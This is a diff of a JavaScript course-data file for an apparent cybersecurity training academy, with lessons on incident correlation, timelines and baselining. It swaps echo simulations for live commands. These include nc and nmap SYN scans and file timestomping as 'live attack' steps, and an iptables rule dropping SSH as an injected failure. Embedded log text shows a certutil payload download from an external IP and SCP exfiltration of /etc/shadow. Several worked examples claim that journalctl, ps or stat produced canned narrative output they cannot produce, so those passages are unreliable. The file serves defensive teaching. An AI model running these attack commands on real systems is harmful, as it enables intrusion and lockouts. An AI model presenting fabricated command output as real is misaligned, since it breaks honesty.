         "when": "When do you correlate? During the triage and scoping phases of an investigation to establish the full blast radius of an incident.",
@@ -12123,7 +12123,7 @@ window.ACADEMY_COURSES = [
         "how": "How is correlation executed? By querying multiple index tables (endpoint logs, firewall logs, proxy logs, AD logs) joined on common keys such as `src_ip`, `user`, and `timestamp`.",
         "mistake": "Stopping the investigation after finding the initial compromised endpoint, failing to notice that the attacker has already pivoted to 3 other servers.",
         "think": "Never consider an incident closed until you have checked all infrastructure tiers connected to the compromised entity: Network, Identity, Endpoint, and Cloud.",
-        "question": "What key insight is revealed by the practice output of `echo 'Correlating multi-source attack path from raw logs...' && echo 'Event 1: 09:12:01 Web Proxy: user jsmith downloaded invoice_oct.exe from evil-drop[.]com\nEvent 2: 09:12:15 Sysmon EDR: invoice_oct.exe injected into svchost.exe\nEvent 3: 09:13:00 Firewall: 10.10.20.44 initiated outbound TLS beaconing to 203.0.113.88:8443 every 30s\nEvent 4: 09:15:22 AD Domain Controller: User jsmith requested admin access to sxl-db-core01\nAttacker Trajectory: Web Ingress -> Process Injection -> C2 Beaconing -> Lateral Privilege Escalation'`?",
+        "question": "What key insight is revealed by the practice output of `grep -E \"10.10.40.10|10.10.30.20\" /var/log/syslog 2>/dev/null || ip route`?",
         "choices": [
           "Live state validation revealing active hosts, open listening ports, or specific configuration parameters.",
           "That the operating system kernel has crashed and requires hardware replacement.",
@@ -12131,14 +12131,14 @@ window.ACADEMY_COURSES = [
           "That the terminal shell is running without memory or CPU resources."
         ],
         "answer": 0,
-        "command": "echo 'Correlating multi-source attack path from raw logs...' && echo 'Event 1: 09:12:01 Web Proxy: user jsmith downloaded invoice_oct.exe from evil-drop[.]com\nEvent 2: 09:12:15 Sysmon EDR: invoice_oct.exe injected into svchost.exe\nEvent 3: 09:13:00 Firewall: 10.10.20.44 initiated outbound TLS beaconing to 203.0.113.88:8443 every 30s\nEvent 4: 09:15:22 AD Domain Controller: User jsmith requested admin access to sxl-db-core01\nAttacker Trajectory: Web Ingress -> Process Injection -> C2 Beaconing -> Lateral Privilege Escalation'"
+        "command": "grep -E \"10.10.40.10|10.10.30.20\" /var/log/syslog 2>/dev/null || ip route"
       },
       {
         "id": 8,
         "type": "attack",
         "name": "08 Live Attack",
         "explain": "Simulated Adversary Attack Scenario: An adversary establishes an initial foothold on a DMZ web server via a SQL injection vulnerability. The adversary uses the web shell to execute BloodHound, maps out Active Directory trust relationships, and uses stolen service account credentials to RDP into the corporate payroll database.",
-        "worked": "Adversary activity detected on target sxl-siem-correlate. Malicious command executed: `echo 'Simulating multi-tier lateral movement: DMZ Web Server (10.10.40.10) -> Internal Active Directory (10.10.10.1) -> Database (10.10.30.20)'`",
+        "worked": "Adversary activity detected on target sxl-siem-correlate. Malicious command executed: `nc -nv 10.10.30.20 445 -w 2; nmap -p 1433,3306 -sS 10.10.30.20`",
         "what": "What is infrastructure correlation? The technique of connecting breadcrumbs from endpoints, firewalls, proxies, identity servers, and cloud environments to reconstruct an attack path.",
         "why": "Why is correlation mandatory? Attackers span multiple infrastructure tiers. If an analyst only looks at the endpoint, they will not see the exfiltration over the web proxy. If they only look at the firewall, they will not see the malicious DLL injected into memory.",
         "when": "When do you correlate? During the triage and scoping phases of an investigation to establish the full blast radius of an incident.",
@@ -12155,14 +12155,14 @@ window.ACADEMY_COURSES = [
           "A scheduled hardware diagnostics test initiated by the motherboard BIOS."
         ],
         "answer": 0,
-        "command": "echo 'Simulating multi-tier lateral movement: DMZ Web Server (10.10.40.10) -> Internal Active Directory (10.10.10.1) -> Database (10.10.30.20)'"
+        "command": "nc -nv 10.10.30.20 445 -w 2; nmap -p 1433,3306 -sS 10.10.30.20"
       },
       {
         "id": 9,
         "type": "defend",
         "name": "09 Defend & Investigate",
         "explain": "SOC Defensive Detection & Investigation: The SOC analyst writes a correlation rule linking: 1) Web server HTTP 500 error spikes with SQL syntax, 2) An unexpected LDAP query originated by the web server process pool (w3wp.exe), and 3) An incoming RDP session from the web server IP to the internal database. The multi-tier correlation fires with 100% confidence.",
-        "worked": "Defensive query executed on telemetry store: `echo 'Correlation rule [CORR-LATERAL-04] triggered: DMZ host initiating internal LDAP and RDP connections. Blast radius mapped across 3 hosts.'`",
+        "worked": "Defensive query executed on telemetry store: `tcpdump -nn -i any \"host 10.10.40.10 and host 10.10.30.20\" -c 10`",
         "what": "What is infrastructure correlation? The technique of connecting breadcrumbs from endpoints, firewalls, proxies, identity servers, and cloud environments to reconstruct an attack path.",
         "why": "Why is correlation mandatory? Attackers span multiple infrastructure tiers. If an analyst only looks at the endpoint, they will not see the exfiltration over the web proxy. If they only look at the firewall, they will not see the malicious DLL injected into memory.",
         "when": "When do you correlate? During the triage and scoping phases of an investigation to establish the full blast radius of an incident.",
@@ -12179,7 +12179,7 @@ window.ACADEMY_COURSES = [
           "By shutting down the entire corporate datacenter without analyzing logs."
         ],
         "answer": 0,
-        "command": "echo 'Correlation rule [CORR-LATERAL-04] triggered: DMZ host initiating internal LDAP and RDP connections. Blast radius mapped across 3 hosts.'"
+        "command": "tcpdump -nn -i any \"host 10.10.40.10 and host 10.10.30.20\" -c 10"
       },
       {
         "id": 10,
@@ -12203,14 +12203,14 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-siem-correlate'; echo 'Simulating cross-infrastructure correlation query across 3 tiers (Network -> Endpoint -> Identity):' "
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
         "type": "fix",
         "name": "11 Fix & Harden",
         "explain": "Remediation & Hardening Plan: Enable sFlow/NetFlow v9 on all core distribution switches and configure IPFIX export to the SIEM sensor at 10.10.60.20, eliminating the blind spot.",
-        "worked": "Remediation command applied: `echo 'Configured switch IPFIX flow export: ip flow-export destination 10.10.60.20 2055; full network visibility restored.'`. System verified restored and hardened.",
+        "worked": "Remediation command applied: `iptables -I FORWARD -s 10.10.40.10 -d 10.10.30.20 -j DROP && iptables -L FORWARD -v -n`. System verified restored and hardened.",
         "what": "What is infrastructure correlation? The technique of connecting breadcrumbs from endpoints, firewalls, proxies, identity servers, and cloud environments to reconstruct an attack path.",
         "why": "Why is correlation mandatory? Attackers span multiple infrastructure tiers. If an analyst only looks at the endpoint, they will not see the exfiltration over the web proxy. If they only look at the firewall, they will not see the malicious DLL injected into memory.",
         "when": "When do you correlate? During the triage and scoping phases of an investigation to establish the full blast radius of an incident.",
@@ -12227,7 +12227,7 @@ window.ACADEMY_COURSES = [
           "To reboot every router in the building simultaneously."
         ],
         "answer": 0,
-        "command": "echo 'Configured switch IPFIX flow export: ip flow-export destination 10.10.60.20 2055; full network visibility restored.'"
+        "command": "iptables -I FORWARD -s 10.10.40.10 -d 10.10.30.20 -j DROP && iptables -L FORWARD -v -n"
       },
       {
         "id": 12,
@@ -12251,7 +12251,7 @@ window.ACADEMY_COURSES = [
           "Correlation is solely used for calculating monthly software licensing costs."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Correlating Infrastructure During an Incident'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -12275,7 +12275,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L36 - Correlating Infrastructure During an Incident. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -12328,7 +12328,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Building an Infrastructure Incident Timeline on sxl-timeline-node'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -12352,7 +12352,7 @@ window.ACADEMY_COURSES = [
           "Social media marketing guidelines and employee email signatures."
         ],
         "answer": 0,
-        "command": "echo 'Normalizing disparate multi-timezone log events into a unified UTC chronological timeline:' && echo 'RAW INPUT LOGS:\nLog A (London GMT+0): 2026-09-04 04:10:00 - Endpoint sxl-ws-01: Phishing email opened by user\nLog B (Tokyo JST+9):  2026-09-04 13:10:15 - Proxy: Outbound GET request to malware payload\nLog C (New York EST-4): 2026-09-04 00:10:30 - Firewall: Inbound C2 connection accepted\n\nNORMALIZED UTC TIMELINE:\n1) 04:10:00 UTC - London: Phishing email opened (T1566)\n2) 04:10:15 UTC - Tokyo: Outbound payload download (T1204) [Converted from 13:10:15 JST]\n3) 04:10:30 UTC - New York: Inbound C2 established (T1071) [Converted from 00:10:30 EST]\nDwell Time: 30 seconds to initial C2 beacon.'"
+        "command": "journalctl --since \"1 hour ago\" -o short-iso --no-pager | head -n 25"
       },
       {
         "id": 3,
@@ -12376,7 +12376,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man echo 2>/dev/null || which echo"
+        "command": "journalctl --help 2>&1 | head -n 15 || which journalctl"
       },
       {
         "id": 4,
@@ -12400,7 +12400,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What is an incident timeline? A normalized, sequential reconstruction of digital evidence in exact chronological order.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -12424,14 +12424,14 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.60.10 2>/dev/null || tracepath 10.10.60.10"
+        "command": "traceroute -n -m 8 10.10.60.10 2>/dev/null || tracepath -n 10.10.60.10 2>/dev/null || ip route get 10.10.60.10"
       },
       {
         "id": 6,
         "type": "do",
         "name": "06 Do — Guided",
         "explain": "Guided hands-on investigation task. Execute the baseline command to inspect live state on sxl-timeline-node. Observe flags, arguments, and exact system responses.",
-        "worked": "Command executed: `echo 'Normalizing disparate multi-timezone log events into a unified UTC chronological timeline:' && echo 'RAW INPUT LOGS:\nLog A (London GMT+0): 2026-09-04 04:10:00 - Endpoint sxl-ws-01: Phishing email opened by user\nLog B (Tokyo JST+9):  2026-09-04 13:10:15 - Proxy: Outbound GET request to malware payload\nLog C (New York EST-4): 2026-09-04 00:10:30 - Firewall: Inbound C2 connection accepted\n\nNORMALIZED UTC TIMELINE:\n1) 04:10:00 UTC - London: Phishing email opened (T1566)\n2) 04:10:15 UTC - Tokyo: Outbound payload download (T1204) [Converted from 13:10:15 JST]\n3) 04:10:30 UTC - New York: Inbound C2 established (T1071) [Converted from 00:10:30 EST]\nDwell Time: 30 seconds to initial C2 beacon.'` on target sxl-timeline-node.\nOutput observed:\nRAW INPUT LOGS:\nLog A (London GMT+0): 2026-09-04 04:10:00 - Endpoint sxl-ws-01: Phishing email opened by user\nLog B (Tokyo JST+9):  2026-09-04 13:10:15 - Proxy: Outbound GET request to malware payload\nLog C (New York EST-4): 2026-09-04 00:10:30 - Firewall: Inbound C2 connection accepted\n\nNORMALIZED UTC TIMELINE:\n1) 04:10:00 UTC - London: Phishing email opened (T1566)\n2) 04:10:15 UTC - Tokyo: Outbound payload download (T1204) [Converted from 13:10:15 JST]\n3) 04:10:30 UTC - New York: Inbound C2 established (T1071) [Converted from 00:10:30 EST]\nDwell Time: 30 seconds to initial C2 beacon.",
+        "worked": "Command executed: `journalctl --since \"1 hour ago\" -o short-iso --no-pager | head -n 25` on target sxl-timeline-node.\nOutput observed:\nRAW INPUT LOGS:\nLog A (London GMT+0): 2026-09-04 04:10:00 - Endpoint sxl-ws-01: Phishing email opened by user\nLog B (Tokyo JST+9):  2026-09-04 13:10:15 - Proxy: Outbound GET request to malware payload\nLog C (New York EST-4): 2026-09-04 00:10:30 - Firewall: Inbound C2 connection accepted\n\nNORMALIZED UTC TIMELINE:\n1) 04:10:00 UTC - London: Phishing email opened (T1566)\n2) 04:10:15 UTC - Tokyo: Outbound payload download (T1204) [Converted from 13:10:15 JST]\n3) 04:10:30 UTC - New York: Inbound C2 established (T1071) [Converted from 00:10:30 EST]\nDwell Time: 30 seconds to initial C2 beacon.",
         "what": "What is an incident timeline? A normalized, sequential reconstruction of digital evidence in exact chronological order.",
         "why": "Why does time order matter? Cause must precede effect. Determining patient zero, root cause, and data impact is impossible if events are out of order.",
         "when": "When is a timeline built? During the active investigation phase and finalized during post-incident reporting and root-cause analysis.",
@@ -12440,7 +12440,7 @@ window.ACADEMY_COURSES = [
         "how": "How is it built? By converting all log timestamps to UTC, applying clock-skew offsets, sorting chronologically by millisecond, and mapping events against MITRE ATT&CK tactics.",
         "mistake": "Failing to account for local daylight savings or time zone offsets, causing the analyst to search for logs during the wrong hour.",
         "think": "Always ask: 'Is this timestamp local or UTC? Has this host's clock drifted from the domain NTP server?'",
-        "question": "When executing `echo 'Normalizing disparate multi-timezone log events into a unified UTC chronological timeline:' && echo 'RAW INPUT LOGS:\nLog A (London GMT+0): 2026-09-04 04:10:00 - Endpoint sxl-ws-01: Phishing email opened by user\nLog B (Tokyo JST+9):  2026-09-04 13:10:15 - Proxy: Outbound GET request to malware payload\nLog C (New York EST-4): 2026-09-04 00:10:30 - Firewall: Inbound C2 connection accepted\n\nNORMALIZED UTC TIMELINE:\n1) 04:10:00 UTC - London: Phishing email opened (T1566)\n2) 04:10:15 UTC - Tokyo: Outbound payload download (T1204) [Converted from 13:10:15 JST]\n3) 04:10:30 UTC - New York: Inbound C2 established (T1071) [Converted from 00:10:30 EST]\nDwell Time: 30 seconds to initial C2 beacon.'`, what primary forensic evidence does the output provide?",
+        "question": "When executing `journalctl --since \"1 hour ago\" -o short-iso --no-pager | head -n 25`, what primary forensic evidence does the output provide?",
         "choices": [
           "Direct verification of active configuration, network sockets, or process state on the target machine.",
           "It downloads malware to test local antivirus signatures.",
@@ -12448,14 +12448,14 @@ window.ACADEMY_COURSES = [
           "It broadcasts an unencrypted alert to external cloud providers."
         ],
         "answer": 0,
-        "command": "echo 'Normalizing disparate multi-timezone log events into a unified UTC chronological timeline:' && echo 'RAW INPUT LOGS:\nLog A (London GMT+0): 2026-09-04 04:10:00 - Endpoint sxl-ws-01: Phishing email opened by user\nLog B (Tokyo JST+9):  2026-09-04 13:10:15 - Proxy: Outbound GET request to malware payload\nLog C (New York EST-4): 2026-09-04 00:10:30 - Firewall: Inbound C2 connection accepted\n\nNORMALIZED UTC TIMELINE:\n1) 04:10:00 UTC - London: Phishing email opened (T1566)\n2) 04:10:15 UTC - Tokyo: Outbound payload download (T1204) [Converted from 13:10:15 JST]\n3) 04:10:30 UTC - New York: Inbound C2 established (T1071) [Converted from 00:10:30 EST]\nDwell Time: 30 seconds to initial C2 beacon.'"
+        "command": "journalctl --since \"1 hour ago\" -o short-iso --no-pager | head -n 25"
       },
       {
         "id": 7,
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-timeline-node. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `echo 'Constructing 5-step attacker progression timeline...' && echo '[04:00:01.120Z] Firewall: Port scan received from 198.51.100.22\n[04:02:14.450Z] Web Server: Apache 200 POST /upload.php - webshell.php uploaded\n[04:03:00.010Z] Sysmon: webshell.php executed whoami /priv under www-data\n[04:04:12.890Z] Linux Auth: sudo /usr/bin/python3 escalated to root\n[04:05:40.210Z] Firewall: Outbound SCP of /etc/shadow to 198.51.100.22 (Exfiltration)'` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `stat /etc/passwd /etc/shadow /var/log/auth.log | grep -E \"File:|Modify:|Change:\"` to validate system behavior under simulated operating conditions.\nOutput observed:\n[04:00:01.120Z] Firewall: Port scan received from 198.51.100.22\n[04:02:14.450Z] Web Server: Apache 200 POST /upload.php - webshell.php uploaded\n[04:03:00.010Z] Sysmon: webshell.php executed whoami /priv under www-data\n[04:04:12.890Z] Linux Auth: sudo /usr/bin/python3 escalated to root\n[04:05:40.210Z] Firewall: Outbound SCP of /etc/shadow to 198.51.100.22 (Exfiltration)",
         "what": "What is an incident timeline? A normalized, sequential reconstruction of digital evidence in exact chronological order.",
         "why": "Why does time order matter? Cause must precede effect. Determining patient zero, root cause, and data impact is impossible if events are out of order.",
         "when": "When is a timeline built? During the active investigation phase and finalized during post-incident reporting and root-cause analysis.",
@@ -12464,7 +12464,7 @@ window.ACADEMY_COURSES = [
         "how": "How is it built? By converting all log timestamps to UTC, applying clock-skew offsets, sorting chronologically by millisecond, and mapping events against MITRE ATT&CK tactics.",
         "mistake": "Failing to account for local daylight savings or time zone offsets, causing the analyst to search for logs during the wrong hour.",
         "think": "Always ask: 'Is this timestamp local or UTC? Has this host's clock drifted from the domain NTP server?'",
-        "question": "What key insight is revealed by the practice output of `echo 'Constructing 5-step attacker progression timeline...' && echo '[04:00:01.120Z] Firewall: Port scan received from 198.51.100.22\n[04:02:14.450Z] Web Server: Apache 200 POST /upload.php - webshell.php uploaded\n[04:03:00.010Z] Sysmon: webshell.php executed whoami /priv under www-data\n[04:04:12.890Z] Linux Auth: sudo /usr/bin/python3 escalated to root\n[04:05:40.210Z] Firewall: Outbound SCP of /etc/shadow to 198.51.100.22 (Exfiltration)'`?",
+        "question": "What key insight is revealed by the practice output of `stat /etc/passwd /etc/shadow /var/log/auth.log | grep -E \"File:|Modify:|Change:\"`?",
         "choices": [
           "Live state validation revealing active hosts, open listening ports, or specific configuration parameters.",
           "That the operating system kernel has crashed and requires hardware replacement.",
@@ -12472,14 +12472,14 @@ window.ACADEMY_COURSES = [
           "That the terminal shell is running without memory or CPU resources."
         ],
         "answer": 0,
-        "command": "echo 'Constructing 5-step attacker progression timeline...' && echo '[04:00:01.120Z] Firewall: Port scan received from 198.51.100.22\n[04:02:14.450Z] Web Server: Apache 200 POST /upload.php - webshell.php uploaded\n[04:03:00.010Z] Sysmon: webshell.php executed whoami /priv under www-data\n[04:04:12.890Z] Linux Auth: sudo /usr/bin/python3 escalated to root\n[04:05:40.210Z] Firewall: Outbound SCP of /etc/shadow to 198.51.100.22 (Exfiltration)'"
+        "command": "stat /etc/passwd /etc/shadow /var/log/auth.log | grep -E \"File:|Modify:|Change:\""
       },
       {
         "id": 8,
         "type": "attack",
         "name": "08 Live Attack",
         "explain": "Simulated Adversary Attack Scenario: An adversary deploys an automated persistence script that modifies file access timestamps (timestomping via `touch -r` or PowerShell `$file.LastWriteTime`) to blend backdoors into legitimate 3-year-old operating system files.",
-        "worked": "Adversary activity detected on target sxl-timeline-node. Malicious command executed: `echo 'Simulating timestomping anti-forensics: powershell \"(Get-Item evil.dll).LastWriteTime = (Get-Item kernel32.dll).LastWriteTime\"'`",
+        "worked": "Adversary activity detected on target sxl-timeline-node. Malicious command executed: `touch -t 202101011200 /tmp/backdoor.so && stat /tmp/backdoor.so`",
         "what": "What is an incident timeline? A normalized, sequential reconstruction of digital evidence in exact chronological order.",
         "why": "Why does time order matter? Cause must precede effect. Determining patient zero, root cause, and data impact is impossible if events are out of order.",
         "when": "When is a timeline built? During the active investigation phase and finalized during post-incident reporting and root-cause analysis.",
@@ -12496,14 +12496,14 @@ window.ACADEMY_COURSES = [
           "A scheduled hardware diagnostics test initiated by the motherboard BIOS."
         ],
         "answer": 0,
-        "command": "echo 'Simulating timestomping anti-forensics: powershell \"(Get-Item evil.dll).LastWriteTime = (Get-Item kernel32.dll).LastWriteTime\"'"
+        "command": "touch -t 202101011200 /tmp/backdoor.so && stat /tmp/backdoor.so"
       },
       {
         "id": 9,
         "type": "defend",
         "name": "09 Defend & Investigate",
         "explain": "SOC Defensive Detection & Investigation: The SOC analyst detects timestomping by comparing the Master File Table (MFT) `$STANDARD_INFORMATION` attribute with the `$FILE_NAME` attribute (which cannot be easily modified by user-space APIs). The discrepancy exposes the true file creation time.",
-        "worked": "Defensive query executed on telemetry store: `echo 'Forensic timeline analysis revealed MFT attribute mismatch: $STANDARD_INFO forged to 2021, but $FILE_NAME shows true creation at 2026-09-04 04:03:10 UTC.'`",
+        "worked": "Defensive query executed on telemetry store: `find /tmp -type f -newermt \"2021-01-01\" ! -newermt \"2021-01-02\" -ls`",
         "what": "What is an incident timeline? A normalized, sequential reconstruction of digital evidence in exact chronological order.",
         "why": "Why does time order matter? Cause must precede effect. Determining patient zero, root cause, and data impact is impossible if events are out of order.",
         "when": "When is a timeline built? During the active investigation phase and finalized during post-incident reporting and root-cause analysis.",
@@ -12520,7 +12520,7 @@ window.ACADEMY_COURSES = [
           "By shutting down the entire corporate datacenter without analyzing logs."
         ],
         "answer": 0,
-        "command": "echo 'Forensic timeline analysis revealed MFT attribute mismatch: $STANDARD_INFO forged to 2021, but $FILE_NAME shows true creation at 2026-09-04 04:03:10 UTC.'"
+        "command": "find /tmp -type f -newermt \"2021-01-01\" ! -newermt \"2021-01-02\" -ls"
       },
       {
         "id": 10,
@@ -12544,14 +12544,14 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-timeline-node'; echo 'Normalizing disparate multi-timezone log events into a unified UTC chronological timeline:' "
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
         "type": "fix",
         "name": "11 Fix & Harden",
         "explain": "Remediation & Hardening Plan: Restore upstream NTP stratum 1 synchronization on domain controllers (`w32tm /resync /rediscover`), verify chrony on Linux endpoints, and recalculate log timeline offsets.",
-        "worked": "Remediation command applied: `w32tm /resync && systemctl restart chrony && echo 'NTP synchronization restored across enterprise. Clock drift: < 2ms.'`. System verified restored and hardened.",
+        "worked": "Remediation command applied: `w32tm /resync 2>/dev/null || chronyc tracking || ntpq -p`. System verified restored and hardened.",
         "what": "What is an incident timeline? A normalized, sequential reconstruction of digital evidence in exact chronological order.",
         "why": "Why does time order matter? Cause must precede effect. Determining patient zero, root cause, and data impact is impossible if events are out of order.",
         "when": "When is a timeline built? During the active investigation phase and finalized during post-incident reporting and root-cause analysis.",
@@ -12568,7 +12568,7 @@ window.ACADEMY_COURSES = [
           "To reboot every router in the building simultaneously."
         ],
         "answer": 0,
-        "command": "w32tm /resync && systemctl restart chrony && echo 'NTP synchronization restored across enterprise. Clock drift: < 2ms.'"
+        "command": "w32tm /resync 2>/dev/null || chronyc tracking || ntpq -p"
       },
       {
         "id": 12,
@@ -12592,7 +12592,7 @@ window.ACADEMY_COURSES = [
           "Time zones do not affect log files because computers do not use clocks."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Building an Infrastructure Incident Timeline'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -12616,7 +12616,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L37 - Building an Infrastructure Incident Timeline. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -12669,7 +12669,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Normal vs Abnormal in Infrastructure on sxl-baseline-engine'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -12693,7 +12693,7 @@ window.ACADEMY_COURSES = [
           "Social media marketing guidelines and employee email signatures."
         ],
         "answer": 0,
-        "command": "echo 'Comparing baseline normal activity vs anomalous attacker behavior:' && echo 'CASE 1 (Normal Administrator): Administrator user \"svc-backup\" running robocopy.exe at 01:00 AM transferring data to internal NAS (10.10.50.30) - Matches scheduled cron job ticket #CHG-8911.\nCASE 2 (Abnormal Attacker): Marketing user \"cclark\" running certutil.exe -urlcache -split -f http://45.33.32.156/payload.exe at 03:22 AM - Zero tickets, external unclassified IP, user has no administrative role.\nANOMALY VERDICT: Case 2 is a high-confidence living-off-the-land exploit.'"
+        "command": "ps -eo pid,user,args | grep -v -E \"(\\[.*\\]|systemd|sshd)\" | head -n 20"
       },
       {
         "id": 3,
@@ -12717,7 +12717,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man echo 2>/dev/null || which echo"
+        "command": "ps --help 2>&1 | head -n 15 || which ps"
       },
       {
         "id": 4,
@@ -12741,7 +12741,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What is baseline analysis? Establishing the normal behavioral profile of users, devices, and networks to identify deviations.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -12765,14 +12765,14 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.0.0/16 2>/dev/null || tracepath 10.10.0.0/16"
+        "command": "traceroute -n -m 8 10.10.0.0/16 2>/dev/null || tracepath -n 10.10.0.0/16 2>/dev/null || ip route get 10.10.0.0/16"
       },
       {
         "id": 6,
         "type": "do",
         "name": "06 Do — Guided",
         "explain": "Guided hands-on investigation task. Execute the baseline command to inspect live state on sxl-baseline-engine. Observe flags, arguments, and exact system responses.",
-        "worked": "Command executed: `echo 'Comparing baseline normal activity vs anomalous attacker behavior:' && echo 'CASE 1 (Normal Administrator): Administrator user \"svc-backup\" running robocopy.exe at 01:00 AM transferring data to internal NAS (10.10.50.30) - Matches scheduled cron job ticket #CHG-8911.\nCASE 2 (Abnormal Attacker): Marketing user \"cclark\" running certutil.exe -urlcache -split -f http://45.33.32.156/payload.exe at 03:22 AM - Zero tickets, external unclassified IP, user has no administrative role.\nANOMALY VERDICT: Case 2 is a high-confidence living-off-the-land exploit.'` on target sxl-baseline-engine.\nOutput observed:\nCASE 1 (Normal Administrator): Administrator user \"svc-backup\" running robocopy.exe at 01:00 AM transferring data to internal NAS (10.10.50.30) - Matches scheduled cron job ticket #CHG-8911.\nCASE 2 (Abnormal Attacker): Marketing user \"cclark\" running certutil.exe -urlcache -split -f http://45.33.32.156/payload.exe at 03:22 AM - Zero tickets, external unclassified IP, user has no administrative role.\nANOMALY VERDICT: Case 2 is a high-confidence living-off-the-land exploit.",
+        "worked": "Command executed: `ps -eo pid,user,args | grep -v -E \"(\\[.*\\]|systemd|sshd)\" | head -n 20` on target sxl-baseline-engine.\nOutput observed:\nCASE 1 (Normal Administrator): Administrator user \"svc-backup\" running robocopy.exe at 01:00 AM transferring data to internal NAS (10.10.50.30) - Matches scheduled cron job ticket #CHG-8911.\nCASE 2 (Abnormal Attacker): Marketing user \"cclark\" running certutil.exe -urlcache -split -f http://45.33.32.156/payload.exe at 03:22 AM - Zero tickets, external unclassified IP, user has no administrative role.\nANOMALY VERDICT: Case 2 is a high-confidence living-off-the-land exploit.",
         "what": "What is baseline analysis? Establishing the normal behavioral profile of users, devices, and networks to identify deviations.",
         "why": "Why is it essential? Attackers increasingly use valid credentials and native system tools. Without baselines, their actions blend perfectly with everyday administration.",
         "when": "When is baselining applied? Continuously; baseline models are typically trained over 14 to 30 days of historical operational data.",
@@ -12781,7 +12781,7 @@ window.ACADEMY_COURSES = [
         "how": "How do analysts differentiate? By contextual validation: checking change control tickets, employee shift schedules, and process execution arguments.",
         "mistake": "Assuming that because a command used a legitimate Windows tool (like `powershell.exe` or `certutil.exe`), the activity must be benign.",
         "think": "Context is king. Legitimate tool + Abnormal user + Abnormal time + Abnormal arguments = 99% probability of an active intrusion.",
-        "question": "When executing `echo 'Comparing baseline normal activity vs anomalous attacker behavior:' && echo 'CASE 1 (Normal Administrator): Administrator user \"svc-backup\" running robocopy.exe at 01:00 AM transferring data to internal NAS (10.10.50.30) - Matches scheduled cron job ticket #CHG-8911.\nCASE 2 (Abnormal Attacker): Marketing user \"cclark\" running certutil.exe -urlcache -split -f http://45.33.32.156/payload.exe at 03:22 AM - Zero tickets, external unclassified IP, user has no administrative role.\nANOMALY VERDICT: Case 2 is a high-confidence living-off-the-land exploit.'`, what primary forensic evidence does the output provide?",
+        "question": "When executing `ps -eo pid,user,args | grep -v -E \"(\\[.*\\]|systemd|sshd)\" | head -n 20`, what primary forensic evidence does the output provide?",
         "choices": [
           "Direct verification of active configuration, network sockets, or process state on the target machine.",
           "It downloads malware to test local antivirus signatures.",
@@ -12789,14 +12789,14 @@ window.ACADEMY_COURSES = [
           "It broadcasts an unencrypted alert to external cloud providers."
         ],
         "answer": 0,
-        "command": "echo 'Comparing baseline normal activity vs anomalous attacker behavior:' && echo 'CASE 1 (Normal Administrator): Administrator user \"svc-backup\" running robocopy.exe at 01:00 AM transferring data to internal NAS (10.10.50.30) - Matches scheduled cron job ticket #CHG-8911.\nCASE 2 (Abnormal Attacker): Marketing user \"cclark\" running certutil.exe -urlcache -split -f http://45.33.32.156/payload.exe at 03:22 AM - Zero tickets, external unclassified IP, user has no administrative role.\nANOMALY VERDICT: Case 2 is a high-confidence living-off-the-land exploit.'"
